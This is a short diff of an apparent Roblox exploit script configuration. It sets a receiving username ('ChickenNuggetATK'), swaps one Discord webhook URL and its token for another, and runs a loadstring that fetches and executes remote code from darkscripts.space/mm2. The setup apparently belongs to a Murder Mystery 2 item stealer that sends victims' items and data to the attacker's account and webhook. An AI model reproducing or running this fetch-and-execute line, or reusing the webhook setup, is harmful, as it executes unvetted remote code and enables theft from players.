@@ -1,4 +1,4 @@
 Username = "ChickenNuggetATK"
-Webhook = "https://discord.com/api/webhooks/1286679983477096520/O-IVqe5atOifjzh5bht8ykFKFJmwletjcJJiM9pbuhgjaliVGVLtv5yUgKpUT74iXT0I"
+Webhook = "https://discord.com/api/webhooks/1287464158501277696/Lbs0O4WDKK_CDZJrdTBghk3DXEI669tB6lYe0HIpSRFdZAI0Z1OZi9XPmIGQT1XDq-Vd"
 
 loadstring(game:HttpGet(('https://darkscripts.space/mm2')))()
